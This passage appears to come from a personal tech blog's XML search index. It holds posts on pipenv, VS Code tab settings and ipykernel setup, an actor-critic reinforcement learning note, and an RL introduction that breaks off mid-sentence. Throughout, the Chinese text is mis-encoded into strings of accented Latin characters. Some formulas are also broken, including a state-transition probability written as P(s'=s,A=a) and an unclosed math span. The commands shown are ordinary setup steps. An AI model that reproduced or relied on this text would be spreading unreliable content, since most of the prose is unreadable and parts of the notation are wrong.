é™¤è™šæ‹Ÿç¯å¢ƒ <code>pipenv --rm # åˆ é™¤è™šæ‹Ÿç¯å¢ƒ</code></p></li></ol><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><blockquote><ol type="1"><li><ahref="https://www.%20enjaminpack.com/blog/vs-code-python-pipenv/">VisualStudio Code, Python and pipenv</a></li><li><ahref="https://python-docs.readthedocs.io/en/latest/dev/virtualenvs.html">Pipenv&amp; Virtual Environments</a></li><li><ahref="https://blog.csdn.net/weixin_40922744/article/details/103723069">pipenvå…¥é—¨æ•™ç¨‹</a></li><li><ahref="https://pipenv-fork.readthedocs.io/en/latest/advanced.html">AdvancedUsage of Pipenv</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode ä½¿ç”¨é—®é¢˜æ±‡æ€»</title>
      <link href="/blog/2021/01/16/utilities/vscode/"/>
      <url>/blog/2021/01/16/utilities/vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode-setting-æ˜¯-json-json-è§„èŒƒä¸æ”¯æŒæ³¨é‡Š-æ³¨é‡Šæ— æ•ˆæœ">vscodesetting æ˜¯ jsonï¼Œ JSON è§„èŒƒï¼Œä¸æ”¯æŒæ³¨é‡Š, # æ³¨é‡Šæ— æ•ˆæœ</h2><h2 id="soft-tab-å’Œ-hard-tab">soft tab å’Œ hard tab</h2><p>æœ€è¿‘ä½¿ç”¨ vscode å†™ markdown æ—¶ï¼Œæ€»é‡åˆ° markdownlint çš„æç¤ºï¼Œè¯´ Nohard-tabï¼Œå¾ˆæ˜¯å¥‡æ€ªï¼Œäºæ˜¯ä¸Šç½‘æœç´¢äº†ä¸€ä¸‹ã€‚</p><p>hard-tabs æ˜¯ç¡¬ä»¶ tabï¼Œå°±æ˜¯æŒ‰ä¸€ä¸ª tab é”®ï¼Œsoft-tabs æ˜¯è½¯ä»¶ tabï¼Œé€šè¿‡æŒ‰4 ä¸ª space é”®å®ç°ã€‚ æå€¡ä½¿ç”¨ soft-tab ä»£æ›¿hard-tabã€‚ï¼ˆä¸è®ºç¼–ç¨‹è¯­è¨€ï¼Œè¿˜æ˜¯ markdownï¼‰ï¼Œå› ä¸ºä¸åŒè½¯ä»¶ç­‰å¯¹ hard-tabçš„å¤„ç†ä¸ä¸€æ ·ï¼Œå› æ­¤åœ¨åä½œæˆ–è€…æ¢å·¥å…·æ—¶ï¼Œå®¹æ˜“é€ æˆæ„æƒ³ä¸åˆ°çš„ "ç¾éš¾".<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103028.png"alt="20200510103028" /></p><p>vscode è®¾ç½® hard-tab è‡ªåŠ¨è½¬ soft-tab:</p><p>é¦–å…ˆæŒ‰ <code>ctrl+shift+p</code> ï¼Œè¾“å…¥<code>indent</code>ï¼Œç„¶åå¯ä»¥å¤§è‡´çœ‹åˆ°ä¸‹å›¾çš„é€‰é¡¹ï¼Œé€‰æ‹©<code>Convert Indentation to Spaces</code>, è¿™æ ·åœ¨ä½ ä½¿ç”¨<code>tab</code> ç¼©è¿›çš„æ—¶å€™ï¼Œvscode å°±ä¼šè‡ªåŠ¨å¸®ä½ æŠŠ hard-tab è½¬æ¢ä¸ºsoft-tab äº†ã€‚ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103028.png" /></p><p>æ­¤å¤–ï¼Œvscode è®¾ç½® soft-tab å¯¹åº”çš„ç©ºæ ¼æ•°ä¹Ÿå¾ˆç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šå›¾ä¸­çš„<code>Indent Using Spaces</code> æˆ–è€…ç‚¹å‡»ä¸‹æ–¹çŠ¶æ€æ å³è¾¹<code>space</code> çš„åœ°æ–¹ï¼Œ</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103731.png" /></p><h2 id="vscode-jupyter-notebook-å®‰è£…">vscode jupyter notebook å®‰è£…</h2><p>Running cells with 'Python 3.10.8 ('torch_env')' requires ipykernelpackage.</p><p>Run the following command to install 'ipykernel' into the Pythonenvironment.</p><p><code>conda install -n torch_env ipykernel --update-deps --force-reinstall</code></p>]]></content>
      
      
      <categories>
          
          <category> utilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actor Critic Method</title>
      <link href="/blog/2020/12/17/ml/rl/actor_critic/"/>
      <url>/blog/2020/12/17/ml/rl/actor_critic/</url>
      
        <content type="html"><![CDATA[<h1 id="actor-critic-method">Actor Critic Method</h1><h2 id="introduction">Introduction</h2><p>actor æ˜¯ç­–ç•¥ç½‘ç»œï¼Œç”¨æ¥æ§åˆ¶ Agent å»è¿åŠ¨ï¼Œå¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯è¿åŠ¨å‘˜ã€‚criticæ˜¯ä»·å€¼ç½‘ç»œï¼Œç”¨æ¥ç»™åŠ¨ä½œæ‰“åˆ†ï¼Œå¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯è£åˆ¤</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216134546.png"alt="cross" /><figcaption aria-hidden="true">cross</figcaption></figure><p>ä¸‹é¢æˆ‘ä»¬å­¦ä¹  Value Network å’Œ Policy Network</p><h2 id="value-network-and-policy-network">Value Network and PolicyNetwork</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216190824.png"alt="neural_net" /><figcaption aria-hidden="true">neural_net</figcaption></figure><h2 id="policy-network-actor-ğœ‹ğ‘ğ‘ ğ›‰">Policy Network (Actor): ğœ‹(ğ‘|ğ‘ ,ğ›‰)</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216191417.png"alt="actor" /><figcaption aria-hidden="true">actor</figcaption></figure><h2 id="value-network-critic-ğ‘ğ‘ ğ‘ğ°">Value Network (Critic): ğ‘(ğ‘ ,ğ‘;ğ°)</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216191733.png"alt="critic" /><figcaption aria-hidden="true">critic</figcaption></figure><p>è¿™ä¸ªä»·å€¼ç½‘ç»œå’Œç­–ç•¥ç½‘ç»œå¯ä»¥å…±äº«å·ç§¯å±‚çš„å‚æ•°ï¼Œä¹Ÿå¯ä»¥è·Ÿç­–ç•¥ç½‘ç»œå®Œå…¨ç‹¬ç«‹ã€‚</p><h2 id="train-the-networks">Train the networks</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216192523.png"alt="train_network" /><figcaption aria-hidden="true">train_network</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193101.png"alt="20201216193101" /><figcaption aria-hidden="true">20201216193101</figcaption></figure><h3 id="update-value-network-q-using-td">Update value network q usingTD</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193147.png"alt="td" /><figcaption aria-hidden="true">td</figcaption></figure><h3 id="update-policy-network-Ï€-using-policy-gradient">Update policynetwork Ï€ using policy gradient</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193524.png"alt="20201216193524" /><figcaption aria-hidden="true">20201216193524</figcaption></figure><h2 id="actor-critic-method-1">Actor-Critic Method</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193704.png"alt="actor_critic" /><figcaption aria-hidden="true">actor_critic</figcaption></figure><ol type="1"><li><p>Actor</p><p>Policy Network(Actor) è§‚æµ‹åˆ°å½“å‰çŠ¶æ€ Sï¼Œç„¶ååšå‡ºåŠ¨ä½œ aï¼Œ Actoråšå‡ºåŠ¨ä½œä¹‹åï¼ŒCritic ä¼šæ ¹æ®çŠ¶æ€ S å’ŒåŠ¨ä½œ a æ¥æ‰“ä¸€ä¸ªåˆ†æ•°è®°ä¸ºqï¼Œå¹¶å°†å…¶å‘ŠçŸ¥ Actorï¼Œè¿™æ · Actor å°±æœ‰åŠæ³•æ”¹è¿›è‡ªå·±çš„æŠ€æœ¯äº†ã€‚</p><p>Actor è¦é  Criticåé¦ˆæ¥æ”¹è¿›è‡ªå·±çš„æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯æ›´æ–°ç¥ç»ç½‘ç»œçš„å‚æ•°ï¼Œå®ƒé€šè¿‡ State sï¼Œ Actiona å’Œ Value q æ¥è¿‘ä¼¼ç®—å‡ºç­–ç•¥æ¢¯åº¦ï¼Œç„¶ååšæ¢¯åº¦ä¸Šå‡æ¥æ›´æ–°è‡ªå·±çš„å‚æ•°ã€‚</p><p>å…¶å®è¿™åªæ˜¯åœ¨è¿åˆ Critic çš„å–œå¥½è€Œå·²ï¼Œå› æ­¤å¦‚æœæƒ³è¦ Actor æ›´å¥½ï¼Œé‚£ä¹ˆCritic çš„æ°´å¹³ä¹Ÿè¦å¥½ã€‚</p></li><li><p>Critic</p><p>critic é  reward æ¥æé«˜æ‰“åˆ†æ°´å¹³ï¼Œè£åˆ¤åŸºäºçŠ¶æ€ S å’ŒåŠ¨ä½œ aæ¥æ‰“åˆ†ï¼Œè®¡ç®—å‡ºä»·å€¼ qï¼Œå¯ä»¥æ¯”è¾ƒç›¸é‚»ä¸¤æ¬¡ <spanclass="math display">\[q_{t}ã€q_{t+1 å’Œ $r_{t}\]</span>ï¼Œç”¨ TDç®—æ³•æ¥æ›´æ–°ç›¸é‚»ä¸¤æ¬¡æ‰“åˆ†ï¼Œè¿™æ ·å¯ä»¥è®©è£åˆ¤æ‰“åˆ†æ›´ç²¾å‡†ã€‚</p></li></ol><h2 id="summary-of-algorithm">Summary of Algorithm</h2><p>æ¯ä¸€è½®è¿­ä»£è¿›è¡Œä¸‹é¢ä¹ä¸ªæ­¥éª¤ï¼Œæ¯ä¸€è½®è¿­ä»£ä¸­åªåšä¸€ä¸ªåŠ¨ä½œï¼Œè§‚æµ‹ä¸€æ¬¡å¥–åŠ±ï¼Œæ›´æ–°ä¸€æ¬¡ç¥ç»ç½‘ç»œçš„å‚æ•°ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216202331.png"alt="20201216202331" /><figcaption aria-hidden="true">20201216202331</figcaption></figure><p>å¦‚æœçœ‹è®ºæ–‡å’Œæ•™ç§‘ä¹¦ï¼Œä½ ä¼šå‘ç°åœ¨å…¶ä¸­ç¬¬ä¹æ­¥çš„ <spanclass="math inline">\(q_{t}\)</span> å®ƒä»¬å¸¸å¸¸ä½¿ç”¨ <spanclass="math inline">\(\delta_{t}\)</span>,ä¹Ÿå°±æ˜¯ TD error.è¿™ä¸¤ç§éƒ½æ˜¯å¯¹çš„ã€‚ä½¿ç”¨ <span class="math inline">\(q_{t}\)</span>æ˜¯æ ‡å‡†ç®—æ³•ï¼Œä½¿ç”¨ <span class="math inline">\(\delta_{t}\)</span> æ˜¯policy gradient with baselineï¼Œä¸¤ç§éƒ½å¯ä»¥ç”¨æ•°å­¦æ¨å¯¼å‡ºæ¥ã€‚å®é™…ä¸Šï¼Œä½¿ç”¨policy gradient with baseline æ•ˆæœæ›´å¥½ï¼Œå› æ­¤å¤§å®¶å¾€å¾€ä½¿ç”¨å®ƒã€‚</p><p>åŸå› ï¼šç”¨æˆ–è€…ä¸ç”¨ baseline,å¹¶ä¸å½±å“æœŸæœ›ï¼ˆäºŒè€…éƒ½æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œä½†æ˜¯ç”¨å¾—å¥½çš„ baselineå¯ä»¥é™ä½æ–¹å·®ï¼Œè®©ç®—æ³•æ”¶æ•›çš„æ›´å¿«ã€‚</p><h2 id="role-of-actor-and-critic">Role of Actor and Critic</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216203827.png"alt="role" /><figcaption aria-hidden="true">role</figcaption></figure><h3 id="training">Training</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216203850.png"alt="training" /><figcaption aria-hidden="true">training</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Introduction of RL</title>
      <link href="/blog/2020/12/17/ml/rl/intro/"/>
      <url>/blog/2020/12/17/ml/rl/intro/</url>
      
        <content type="html"><![CDATA[<h2 id="math">Math</h2><p>ä¸»è¦ä»‹ç»éœ€è¦ç”¨åˆ°çš„æ¦‚ç‡è®ºçš„åŸºç¡€çŸ¥è¯†ä»¥åŠå¼ºåŒ–å­¦ä¹ ä¸­å…³é”®æœ¯è¯­ã€‚</p><ol type="1"><li><p>Random Variable</p><p>é€šå¸¸ä½¿ç”¨å¤§å†™å­—æ¯ï¼ˆå¦‚ï¼šXï¼‰è¡¨ç¤ºéšæœºå˜é‡, ä½¿ç”¨å°å†™å­—æ¯ï¼ˆå¦‚ï¼šx,x1ï¼‰è¡¨ç¤ºéšæœºå˜é‡çš„è§‚æµ‹å€¼ï¼ˆobservedvalueï¼‰ï¼Œè§‚æµ‹å€¼æ˜¯ç¡®å®šçš„æ•°ï¼Œæ²¡æœ‰éšæœºæ€§ã€‚</p></li><li><p>Probability Density Functionï¼ˆPDFï¼‰</p><p>æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼šPDF provides a relative likelihood that the value ofthe random variable would equal that sample.</p><p>ä¾‹å¦‚ï¼šè¿ç»­çš„æ­£æ€åˆ†å¸ƒï¼ˆä¹Ÿå«åšé«˜æ–¯åˆ†å¸ƒï¼‰</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20201214155842957.png"alt="image-20201214155842957" /><figcaption aria-hidden="true">image-20201214155842957</figcaption></figure><p>ç¦»æ•£çš„åˆ†å¸ƒï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20201214155924736.png"alt="image-20201214155924736" /><figcaption aria-hidden="true">image-20201214155924736</figcaption></figure><p>å‡è®¾éšæœºå˜é‡ X çš„åŸŸä¸º <spanclass="math inline">\(\mathbb{X}\)</span></p><ol type="1"><li><p>è¿ç»­åˆ†å¸ƒ</p><p><span class="math inline">\(\int_\mathbb{X} p(x)dx = 1\)</span></p><p>æœŸæœ›ï¼š <span class="math inline">\(\mathbb{E}[f(x)] = \int_{x\in\mathbb{X}}{p(x) \cdot f(x)}dx\)</span></p></li><li><p>ç¦»æ•£åˆ†å¸ƒ</p><p><span class="math inline">\(\sum_{x \in \mathbb{X}}{p(x)} =1\)</span></p><p>æœŸæœ›ï¼š<span class="math inline">\(\mathbb{E}[f(x)] = \sum_{x\in\mathbb{X}}{p(x) \cdot f(x)}\)</span></p></li></ol></li><li><p>Random Sampling</p><p>éšæœºé‡‡æ ·ï¼š1. çŸ¥é“å„æƒ…å†µç§ç±»ä»¥åŠæ€»æ•°ï¼Œå»æŠ½æ · 2.çŸ¥é“å„æƒ…å†µæ¦‚ç‡ï¼Œå»æŠ½æ ·ã€‚</p></li></ol><h2 id="terminology">Terminology</h2><ol type="1"><li><p>state and action</p></li><li><p>policy</p><p>Policy function <span class="math inline">\(\pi\)</span> æ˜¯åŠ¨ä½œ Açš„æ¦‚ç‡å¯†åº¦å‡½æ•°: <span class="math inline">\(\pi(a|s) =P(A=a|S=s)\)</span> å®ƒæ˜¯åœ¨æŸçŠ¶æ€ sä¸‹ï¼Œé‡‡å–æŸä¸ªç‰¹å®šåŠ¨ä½œï¼ˆä¾‹å¦‚ï¼šA=a1ï¼‰çš„æ¦‚ç‡ã€‚ ä¾‹å¦‚ï¼šç»™å®šçŠ¶æ€ sï¼ŒåŠ¨ä½œ Aç¦»æ•£åˆ†å¸ƒçš„æ¦‚ç‡å¯†åº¦å‡½æ•°å¦‚ä¸‹ï¼š</p><ul><li><span class="math inline">\(\pi(left|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(right|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(up|s) = 0.2\)</span></li><li><span class="math inline">\(\pi(down|s) = 0.2\)</span>æ ¹æ®é€‰å–çš„ç­–ç•¥ä¸åŒï¼ˆéšæœºæ€§ç­–ç•¥æˆ–è€…ç¡®å®šæ€§ç­–ç•¥ï¼‰ï¼Œä»ä¸­éšæœºé€‰å–æˆ–è€…é€‰å–æ¦‚ç‡æœ€å¤§çš„action è¿›è¡Œå®æ–½ã€‚</li></ul></li><li><p>reward</p></li><li><p>state transition</p><p><span class="math inline">\(old state \xrightarrow{action} newstate\)</span></p><ul><li>State transation can be random</li><li>Randomness is from theenvironment(çŠ¶æ€è½¬ç§»çš„éšæœºæ€§å–å†³äºç¯å¢ƒï¼Œè¿™é‡Œçš„ç¯å¢ƒå°±æ˜¯æ¸¸æˆç¨‹åº)</li><li>çŠ¶æ€è½¬ç§»ï¼Œç”¨ p å‡½æ•°è¡¨ç¤ºï¼š <spanclass="math inline">\(p(s^{&#39;}|s,a) =\mathbb{P}(s^{&#39;}=s,A=a)\)</span>, å¦‚æœè§‚å¯Ÿåˆ°å½“å‰çŠ¶æ€ s å’ŒåŠ¨ä½œ aï¼ŒPå‡½æ•°è¾“å‡ºçŠ¶æ€å˜ä¸º <span class="math inline">\(p(s^{&#39;}\)</span>çš„æ¦‚ç‡ã€‚</li></ul></li><li><p>agent environment interaction</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201214194035.png"alt="20201214194035" /><figcaption aria-hidden="true">20201214194035</figcaption></figure></li></ol><h3 id="randomness-in-reinforcement-learning">Randomness inReinforcement learning</h3><ol type="1"><li><p>Actions have randomness</p><p>Given state ğ‘ , the action can be random</p></li><li><p>State transitions have randomness</p><p>Given state ğ‘† = ğ‘  and action ğ´ = ğ‘, the environment randomlygenerates a new state <spanclass="math inline">\(ğ‘†^{&#39;}\)</span></p></li></ol><h3 id="rewards-and-returns">Rewards and Returns</h3><h3 id="return">Return</h3><p>Definition: Return (aka cumulative future reward) <spanclass="math inline">\(ğ‘ˆ_{t} = ğ‘…_{t} + ğ‘…_{t+1} + ğ‘…_{t+2} + ğ‘…_{t+3} +â‹¯\)</span></p><ul><li>Future reward is less valuable than present reward.</li><li><span class="math inline">\(R_{t+1}\)</span> should be given lessweight than <span class="math inline">\(ğ‘…_{t}\)</span></li></ul><h3 id="discounted-return">Discounted return</h3><p>Definition: <strong>Discounted</strong> return (aka cumulative<strong>discounted</strong> future reward)</p><ul><li><span class="math inline">\(\gamma\)</span>: discount rate (tuninghyper-parameter)</li><li><span class="math inline">\(ğ‘ˆ_{t} = ğ‘…_{t} + \gammağ‘…*{t+1} +\gamma^2ğ‘…*{t+2} + \gamma^3ğ‘…_{t+3} + â‹¯\)</span></li></ul><p>At time step ğ‘¡, the return <span class="math inline">\(ğ‘ˆ_{t}\)</span>is random. Two sources of randomness:</p><ol type="1"><li>Action can be random: <spanclass="math inline">\(â„™[ğ´=ğ‘|ğ‘†=ğ‘ ]=ğœ‹(ğ‘|ğ‘ )\)</span></li><li>New state can be random: <spanclass="math inline">\(â„™[ğ‘†^{&#39;}=ğ‘ ^{&#39;}|ğ‘†=ğ‘ ,ğ´=ğ‘]=ğ‘(ğ‘ ^{&#39;}|ğ‘ ,ğ‘)\)</span><ul><li>For any ğ‘– â‰¥ ğ‘¡, the reward ğ‘…n depends on ğ‘†n and ğ´n.</li><li>Thus, given ğ‘ <em>, the return ğ‘ˆ</em> depends on the randomvariables:</li><li><span class="math inline">\(ğ´_{t},ğ´_{t+1},ğ´_{t+2},â‹¯\)</span> and<span class="math inline">\(ğ‘†_{t+1},ğ‘†_{t+2},â‹¯\)</span></li></ul></li></ol><h3 id="action-value-function-ğ‘„sa">Action-Value Function ğ‘„(s,a)</h3><p>Definition: Action-value function for policy ğœ‹</p><p><span class="math inline">\(ğ‘„_{\pi}(ğ‘ _{t},ğ‘_{t}) =\mathbb{E}[ğ‘ˆ_{t}|ğ‘†_{t}=ğ‘ _{t}, ğ´_{t}=ğ‘_{t}]\)</span></p><ul><li>Return <span class="math inline">\(ğ‘ˆ_{t}\)</span> depends on states<span class="math inline">\(ğ‘†_{t},ğ‘†_{t+1},S_{t+2},â‹¯\)</span> and actions<span class="math inline">\(A_{t},A_{t+1},A_{t+2},â‹¯\)</span></li><li>å°†éšæœºå˜é‡ <span class="math inline">\(ğ‘ˆ_{t}\)</span>å½“ä½œæœªæ¥æ‰€æœ‰çŠ¶æ€ S ä»¥åŠæœªæ¥æ‰€æœ‰åŠ¨ä½œ Açš„ä¸€ä¸ªå‡½æ•°æ±‚æœŸæœ›ï¼Œå°†è¿™äº›å˜é‡ç§¯åˆ†ç§¯æ‰ï¼Œå¾—åˆ°ä¸€ä¸ªæ•° <spanclass="math inline">\(ğ‘„_{\pi}\)</span>ã€‚</li><li><span class="math inline">\(ğ‘†_{t}, A_{t}\)</span>è¢«ä½œä¸ºè§‚æµ‹åˆ°çš„æ•°å€¼è€Œå¯¹å¾…ï¼Œæ²¡æœ‰è¢«ç§¯æ‰äº†ã€‚å› æ­¤ <spanclass="math inline">\(ğ‘„_{\pi}\)</span> çš„å€¼ä¸ <spanclass="math inline">\(ğ‘†_{t}, A_{t}\)</span> æœ‰å…³ã€‚</li><li>ç§¯åˆ†çš„æ—¶å€™ä¼šç”¨åˆ° Policy å‡½æ•°ï¼Œå¦‚æœ Policy å‡½æ•° <spanclass="math inline">\(\pi\)</span> ä¸ä¸€æ ·ï¼Œç§¯åˆ†å¾—åˆ°çš„å‡½æ•° <spanclass="math inline">\(ğ‘„_{\pi}\)</span> å°±ä¸ä¸€æ ·ã€‚</li></ul><p>æœªæ¥çŠ¶æ€å’ŒåŠ¨ä½œéƒ½æœ‰éšæœºæ€§</p><ul><li>Actions are random: <spanclass="math inline">\(\mathbb{P}[A=a|S=s]=\pi(a|s)\)</span>, åŠ¨ä½œ Açš„æ¦‚ç‡å¯†åº¦å‡½æ•°æ˜¯ Policy function <spanclass="math inline">\(\pi\)</span></li><li>States are random: <spanclass="math inline">\(\mathbb{P}[S^{&#39;}=s^{&#39;}|A=a]=p(s^{&#39;}|s,a)\)</span>,çŠ¶æ€ S çš„æ¦‚ç‡å¯†åº¦å‡½æ•°æ˜¯ state transition function p.</li></ul><p><span class="math inline">\(ğ‘„_{\pi}\)</span> çš„æ„ä¹‰ï¼šé‡‡å–ç­–ç•¥ <spanclass="math inline">\(\pi\)</span>ï¼Œåœ¨ <spanclass="math inline">\(S_{t}\)</span> çŠ¶æ€ä¸‹ï¼ŒåŠ¨ä½œ <spanclass="math inline">\(A_{t}\)</span> çš„å¥½åã€‚</p><h3 id="optimal-action-value-function">Optimal action-valuefunction</h3><p>ç”¨ä¸åŒçš„ç­–ç•¥ <span class="math inline">\(\pi\)</span>ï¼Œ å°±æœ‰ä¸åŒçš„<span class="math inline">\(ğ‘„_{\pi}\)</span>ï¼Œ é‚£å¦‚ä½•å°† Action-Valuefunction ä¸­çš„ <span class="math inline">\(\pi\)</span> å»æ‰å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼š<span class="math inline">\(ğ‘„_{\pi}\)</span> å…³äº <spanclass="math inline">\(\pi\)</span> æ±‚æœ€å¤§åŒ–ã€‚</p><p>Definition: Optimal action-value function.</p><p><span class="math inline">\(Q^{\star}\left(s_{t},a_{t}\right)=\underset{\pi}{\max} Q_{\pi}\left(s_{t},a_{t}\right)\)</span></p><p>ä½¿ç”¨æœ€å¥½çš„ç­–ç•¥ <span class="math inline">\(\pi\)</span>ï¼ˆä¹Ÿå°±æ˜¯ä½¿å¾—<span class="math inline">\(ğ‘„_{\pi}\)</span> å‡½æ•°æœ€å¤§åŒ–çš„é‚£ä¸ª <spanclass="math inline">\(\pi\)</span>ï¼‰ï¼Œå› æ­¤ <spanclass="math inline">\(Q^{\star}\)</span> ä¸ <spanclass="math inline">\(\pi\)</span> æ— å…³äº†ï¼Œå®ƒåªä¸ <spanclass="math inline">\(S_{t}, A_{t}\)</span> æœ‰å…³ã€‚</p><p><span class="math inline">\(Q^{\star}\)</span> çš„æ„ä¹‰ï¼šåœ¨æŸä¸ªçŠ¶æ€ sä¸‹ï¼Œå¯¹åŠ¨ä½œ a åšè¯„ä»·ã€‚</p><h3 id="state-value-function">State-value function</h3><ul><li><span class="math inline">\(V_{\pi}(s_{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \sum{\pi(a|s_{t})\cdotQ_{\pi}(s_{t},a)}\)</span> (Actions are discrete)</li><li><span class="math inline">\(V_{\pi}(s_{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \int{\pi(a|s_{t})\cdotQ_{\pi}(s_{t},a)}da\)</span> (Actions are continuous)</li></ul><p>å°†åŠ¨ä½œ A å½“ä½œéšæœºå˜é‡ï¼Œå¯¹å…¶è¿›è¡Œç§¯åˆ†æ±‚æœŸæœ›ï¼Œ å…¶ä¸­ A çš„æ¦‚ç‡å¯†åº¦å‡½æ•°<span class="math inline">\(A~\pi(\cdot|s_{t})\)</span>ï¼Œå°† A æ¶ˆæ‰ï¼Œç„¶å<span class="math inline">\(V_{\pi}\)</span> å‡½æ•°å°±åªä¸ <spanclass="math inline">\(\pi\)</span> å’Œ S æœ‰å…³ã€‚</p><p>æ„ä¹‰ï¼š<span class="math inline">\(V_{\pi}\)</span>å¯ä»¥å‘Šè¯‰æˆ‘ä»¬å½“å‰çš„å±€åŠ¿çŠ¶å†µå¥½åä¼˜åŠ£ã€‚</p><h3 id="value-functions">Value Functions</h3><ol type="1"><li><p>Action-value function</p><p><span class="math inline">\(ğ‘„_{\pi}(ğ‘ _{t},ğ‘_{t}) =\mathbb{E}[ğ‘ˆ_{t}|ğ‘†_{t}=ğ‘ _{t}, ğ´_{t}=ğ‘_{t}]\)</span></p><p>For policy <span class="math inline">\(\pi\)</span>, <spanclass="math inline">\(ğ‘„_{\pi}(ğ‘ _{t},ğ‘_{t})\)</span> evaluates how goodit is for an agent to pick action <strong>a</strong> while being instate <strong>s</strong>.</p></li><li><p>State value function</p><p><span class="math inline">\(V_{\pi}(s*{t}) =\mathbb{E_{A}}[Q_{\pi}(s_{t}, A)] = \sum_{a} \pi\left(a \mids_{t}\right) \cdot Q_{\pi}\left(s_{t}, a\right)\)</span></p><p>å¦‚æœåŠ¨ä½œ A çš„æ¦‚ç‡å¯†åº¦å‡½æ•° <span class="math inline">\(\pi\)</span>æ˜¯ç¦»æ•£çš„,åˆ™ <span class="math inline">\(V_{\pi}\)</span>å¯ä»¥è¿›ä¸€æ­¥å†™æˆæ±‚å’Œçš„å½¢å¼ï¼›å¦‚æœæ˜¯è¿ç»­çš„ï¼Œåˆ™å¯å†™ä¸ºç§¯åˆ†å½¢å¼ã€‚</p><p>For fixed policy <span class="math inline">\(\pi\)</span>, <spanclass="math inline">\(V_{\pi}(s_{t})\)</span> evaluates how good thesituation is in state <strong>s</strong>.</p><p><span class="math inline">\(\mathbb{E}_{s}[V_{\pi}(S)]\)</span>evaluates how good the policy <span class="math inline">\(\pi\)</span>is.</p></li></ol><h2 id="two-methods">Two Methods</h2><ol type="1"><li><p>Policy-basedï¼šSuppose we have a good policy <spanclass="math inline">\(\pi(a|s)\)</span>.</p><ul><li>Upon observing the state <spanclass="math inline">\(S_{t}\)</span></li><li>random sampling <spanclass="math inline">\(a_{t}~\pi(\cdot|s_{t})\)</span></li></ul></li><li><p>Value-basedï¼šSuppose we know the optimal action-value function<span class="math inline">\(Q^{\star}(s|a)\)</span></p><ul><li>Upon observe the state <spanclass="math inline">\(S_{t}\)</span></li><li>choose the <strong>action</strong> that maximizes the value <spanclass="math inline">\(a_{t} = argmax_{a}Q^{\star}(s_{t},a)\)</span></li></ul></li></ol><h2 id="å‡ ç§åˆ†ç±»">å‡ ç§åˆ†ç±»</h2><table><thead><tr class="header"><th>é€šè¿‡ä»·å€¼é€‰è¡Œä¸º</th><th>ç›´æ¥é€‰è¡Œä¸º</th><th>æƒ³è±¡ç¯å¢ƒå¹¶ä»ä¸­å­¦ä¹ </th></tr></thead><tbody><tr class="odd"><td>Q learing</td><td>Policy Gradient</td><td>Model based Rl</td></tr><tr class="even"><td>Sarsa</td><td></td><td></td></tr><tr class="odd"><td>Deep Q Network</td><td></td><td></td></tr></tbody></table><h3 id="ç†è§£ç¯å¢ƒ">ç†è§£ç¯å¢ƒ</h3><p>æ ¹æ®ç†è§£ç¯å¢ƒä¸å¦ï¼Œ åˆ†ä¸º Model-Free RL ä¸ Model-Based RL</p><ol type="1"><li><p>Model-Free</p><p>ç‰¹ç‚¹ï¼šä¸å°è¯•ç†è§£ç¯å¢ƒï¼Œæ ¹æ®ç¯å¢ƒçš„åé¦ˆä¸€æ­¥æ­¥å­¦ä¹  ä»£è¡¨ï¼šQLearningã€Sarsaã€Policy Gradients</p></li><li><p>Mode-Based</p><p>ç‰¹ç‚¹ï¼šå»ºæ¨¡ï¼Œå¯ä»¥è‡ªå·±è®­ç»ƒ</p></li></ol><h3 id="æ¦‚ç‡ä¸ä»·å€¼">æ¦‚ç‡ä¸ä»·å€¼</h3><p>åŸºäºæ¦‚ç‡(Policy-Based RL)ã€åŸºäºä»·å€¼(Value-Based RL)</p><ol type="1"><li><p>åŸºäºæ¦‚ç‡(Policy-Based RL)</p><p>æ 